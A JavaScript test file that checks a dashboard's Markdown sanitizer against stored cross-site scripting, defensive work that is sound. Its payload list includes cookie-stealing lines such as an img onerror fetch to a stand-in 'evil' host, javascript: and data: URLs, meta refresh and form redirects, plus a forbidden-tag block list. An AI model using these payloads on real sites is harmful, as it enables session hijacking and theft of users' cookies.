// Stored-XSS corpus for everything Headquarters renders as HTML.
//
// The threat: agent result files, completion reports, evidence artifacts, and
// project Markdown are all written by parties we do not control, and the
// dashboard assigns the rendered HTML to innerHTML inside the founder's
// authenticated session — the same session that approves high-risk builds.
// Anything that executes here can approve work as the founder (FCT-P0-04).

import test from "node:test";
import assert from "node:assert/strict";

import {
  decodeEntities,
  escapeHtml,
  markdownRenderingAvailable,
  renderUntrustedMarkdown,
  safeUrl,
  sanitizeHtml,
} from "../../dashboard/backend/lib/safeMarkdown.mjs";

// The allowlist serializer is dependency-free and is the layer that must hold
// even if the Markdown generator changes or is bypassed, so it is exercised
// everywhere. Full-pipeline rendering additionally needs `marked`, a dashboard
// dependency that CI does not install — those tests skip there.
const pipelineTest = markdownRenderingAvailable() ? test : test.skip;

// Tags that must never appear as LIVE markup in rendered output.
const FORBIDDEN_TAGS = new Set([
  "script", "iframe", "object", "embed", "applet", "svg", "math",
  "form", "input", "button", "textarea", "select", "option",
  "style", "link", "base", "meta", "marquee", "details", "body", "html", "frame", "frameset",
]);

// Nothing that survives rendering may be an executable construct.
//
// The check inspects only real tags. Text like "&lt;img onerror=..." is inert by
// definition — the browser renders it as visible characters — so a naive regex
// over the whole string reports false positives on exactly the payloads the
// sanitizer handled correctly.
function assertInert(html, label) {
  const source = String(html);

  for (const match of source.matchAll(/<\/?([a-zA-Z][a-zA-Z0-9-]*)((?:[^>"']|"[^"]*"|'[^']*')*)>/g)) {
    const tag = match[1].toLowerCase();
    const attrs = match[2] || "";
    assert.ok(!FORBIDDEN_TAGS.has(tag), `${label}: live <${tag}> survived → ${source}`);

    for (const attr of attrs.matchAll(/([a-zA-Z_:][-a-zA-Z0-9_:.]*)\s*(?:=\s*(?:"([^"]*)"|'([^']*)'|([^\s"'>]+)))?/g)) {
      const name = attr[1].toLowerCase();
      const value = (attr[2] ?? attr[3] ?? attr[4] ?? "").toLowerCase();
      assert.ok(!name.startsWith("on"), `${label}: event handler ${name} survived → ${source}`);
      assert.ok(name !== "style", `${label}: style attribute survived → ${source}`);
      assert.ok(name !== "srcdoc", `${label}: srcdoc survived → ${source}`);
      assert.ok(name !== "formaction", `${label}: formaction survived → ${source}`);

      if (name === "href" || name === "src") {
        const decoded = decodeEntities(value).replace(/[\u0000- ]/g, "");
        assert.ok(
          !/^(javascript|data|vbscript|file):/i.test(decoded),
          `${label}: executable URL survived in ${name} → ${source}`,
        );
      }
    }
  }
}

const XSS_MARKDOWN = [
  ["script tag", `<script>alert(document.cookie)</script>`],
  ["img onerror", `<img src=x onerror="fetch('//evil/'+document.cookie)">`],
  ["svg onload", `<svg/onload=alert(1)>`],
  ["iframe", `<iframe src="javascript:alert(1)"></iframe>`],
  ["iframe srcdoc", `<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>`],
  ["javascript link", `[click me](javascript:alert(1))`],
  ["javascript link uppercase", `[click me](JaVaScRiPt:alert(1))`],
  ["javascript link with tab", `[click me](java\tscript:alert(1))`],
  ["javascript link with newline", `[click me](java\nscript:alert(1))`],
  ["javascript link leading space", `[click me](\u0000javascript:alert(1))`],
  ["data uri link", `[x](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)`],
  ["vbscript link", `[x](vbscript:msgbox(1))`],
  ["data uri image", `![x](data:text/html,<script>alert(1)</script>)`],
  ["protocol relative", `[x](//evil.example.com/steal)`],
  ["body onload", `<body onload=alert(1)>`],
  ["style block", `<style>body{background:url('//evil/'+document.cookie)}</style>`],
  ["link stylesheet", `<link rel="stylesheet" href="//evil/x.css">`],
  ["base tag", `<base href="//evil/">`],
  ["meta refresh", `<meta http-equiv="refresh" content="0;url=//evil">`],
  ["form", `<form action="//evil"><input name="p"><button>go</button></form>`],
  ["object", `<object data="//evil/x.swf"></object>`],
  ["embed", `<embed src="//evil/x.swf">`],
  ["math", `<math><mtext><script>alert(1)</script></mtext></math>`],
  ["details ontoggle", `<details open ontoggle=alert(1)>x</details>`],
  ["mixed case script", `<ScRiPt>alert(1)</ScRiPt>`],
  ["nested broken script", `<scr<script>ipt>alert(1)</script>`],
  ["attribute breakout", `[x](https://ok.example" onmouseover="alert(1))`],
  ["unclosed tag flood", `<div><div><div>` .repeat(5)],
  ["html comment conditional", `<!--[if IE]><script>alert(1)</script><![endif]-->`],
  ["marquee onstart", `<marquee onstart=alert(1)>x</marquee>`],
  ["a target blank injection", `<a href="//evil" target="_blank">x</a>`],
];

// Runs everywhere, including CI. Feeds each payload straight into the allowlist
// serializer as if it were already-generated HTML — the strongest form of the
// test, because it assumes the generation layer gave us the raw attack verbatim.
test("the allowlist serializer neutralises every payload without any dependency", () => {
  for (const [label, payload] of XSS_MARKDOWN) {
    assertInert(sanitizeHtml(payload), `${label} (allowlist layer)`);
    // Also inside plausible surrounding structure.
    assertInert(sanitizeHtml(`<p>report says:</p>${payload}<p>end</p>`), `${label} (wrapped)`);
  }
});

test("a document rendered without the Markdown library is still inert", () => {
  // The no-marked fallback path must be safe, not merely absent.
  for (const [label, payload] of XSS_MARKDOWN) {
    assertInert(`<pre>${escapeHtml(payload)}</pre>`, `${label} (fallback)`);
  }
});

pipelineTest("every stored-XSS payload renders inert", () => {
  for (const [label, payload] of XSS_MARKDOWN) {
    const html = renderUntrustedMarkdown(payload);
    assertInert(html, label);
  }
});

pipelineTest("the same payloads are inert when wrapped in ordinary report prose", () => {
  for (const [label, payload] of XSS_MARKDOWN) {
    const doc = [
      "# Completion report",
      "",
      "The builder reports success.",
      "",
      payload,
      "",
      "| stage | verdict |",
      "| --- | --- |",
      `| qa | ${payload} |`,
      "",
      "```js",
      payload,
      "```",
      "",
      `> ${payload}`,
    ].join("\n");
    assertInert(renderUntrustedMarkdown(doc), `${label} (in prose)`);
  }
});

pipelineTest("legitimate Markdown still renders as real HTML", () => {
  const html = renderUntrustedMarkdown([
    "# Heading",
    "",
    "Some **bold** and _italic_ text with `code`.",
    "",
    "- one",
    "- two",
    "",
    "[docs](https://example.com/page?a=1&b=2)",
    "",
    "| stage | verdict |",
    "| --- | --- |",
    "| qa | pass |",
    "",
    "```js",
    "const x = 1 < 2;",
    "```",
  ].join("\n"));

  assert.match(html, /<h1[^>]*>Heading<\/h1>/);
  assert.match(html, /<strong>bold<\/strong>/);
  assert.match(html, /<em>italic<\/em>/);
  assert.match(html, /<code>code<\/code>/);
  assert.match(html, /<li>one<\/li>/);
  assert.match(html, /<table>/);
  assert.match(html, /<td>pass<\/td>/);
  // A safe link keeps its href and gains hardening attributes.
  assert.match(html, /<a href="https:\/\/example\.com\/page\?a=1&amp;b=2"[^>]*>docs<\/a>/);
  assert.match(html, /rel="noopener noreferrer nofollow"/);
  assertInert(html, "legitimate markdown");
});

pipelineTest("a refused link keeps its text so no content is silently hidden", () => {
  const html = renderUntrustedMarkdown(`[important note](javascript:alert(1))`);
  assert.match(html, /important note/);
  assert.ok(!/javascript/i.test(html));
});

test("safeUrl accepts real URLs and rejects executable schemes", () => {
  assert.ok(safeUrl("https://example.com/x"));
  assert.ok(safeUrl("http://example.com/x"));
  assert.ok(safeUrl("mailto:founder@example.com"));
  assert.ok(safeUrl("/relative/path"));
  assert.ok(safeUrl("#anchor"));

  for (const bad of [
    "javascript:alert(1)",
    "JAVASCRIPT:alert(1)",
    "java\tscript:alert(1)",
    "java\nscript:alert(1)",
    "\u0000javascript:alert(1)",
    " javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "vbscript:msgbox(1)",
    "file:///etc/passwd",
    "//evil.example.com",
  ]) {
    assert.equal(safeUrl(bad), null, `safeUrl should reject ${JSON.stringify(bad)}`);
  }
});

test("sanitizeHtml drops disallowed tags but keeps their text", () => {
  const html = sanitizeHtml(`<p>before<script>alert(1)</script>after</p>`);
  assert.ok(!/script/i.test(html));
  assert.match(html, /before/);
  assert.match(html, /after/);
});

test("sanitizeHtml strips every event handler and style attribute", () => {
  const html = sanitizeHtml(`<p onclick="alert(1)" style="position:fixed" class="report">text</p>`);
  assert.ok(!/onclick/i.test(html));
  assert.ok(!/style/i.test(html));
  assert.match(html, /text/);
});

test("sanitizeHtml refuses dashboard UI classes an agent tries to borrow", () => {
  // An agent must not be able to forge interface chrome (e.g. a fake approve
  // button) by reusing the dashboard's own class names.
  const html = sanitizeHtml(`<div class="btn btn-approve danger-text">Approve</div>`);
  assert.ok(!/btn-approve/.test(html), `dashboard class survived → ${html}`);
  assert.match(html, /Approve/);
  // Syntax-highlighting classes are still allowed.
  assert.match(sanitizeHtml(`<code class="language-js">x</code>`), /class="language-js"/);
});

test("sanitizeHtml closes unbalanced markup instead of swallowing the page", () => {
  const html = sanitizeHtml(`<div><p>text`);
  assert.match(html, /<\/p>/);
  assert.match(html, /<\/div>/);
});

test("a stray less-than is escaped, not reparsed as markup", () => {
  const html = sanitizeHtml(`a < b and c > d`);
  assert.match(html, /a &lt; b/);
});

test("empty and non-string input is handled without throwing", () => {
  assert.equal(renderUntrustedMarkdown(""), "");
  assert.equal(renderUntrustedMarkdown("   "), "");
  assert.equal(renderUntrustedMarkdown(null), "");
  assert.equal(renderUntrustedMarkdown(undefined), "");
  assert.equal(renderUntrustedMarkdown(42), "");
});

test("escapeHtml covers the quote characters used in attribute contexts", () => {
  assert.equal(escapeHtml(`<>&"'`), "&lt;&gt;&amp;&quot;&#39;");
});

pipelineTest("a very deeply nested document does not hang the renderer", () => {
  const deep = `${"> ".repeat(200)}quote`;
  const html = renderUntrustedMarkdown(deep);
  assertInert(html, "deep nesting");
});
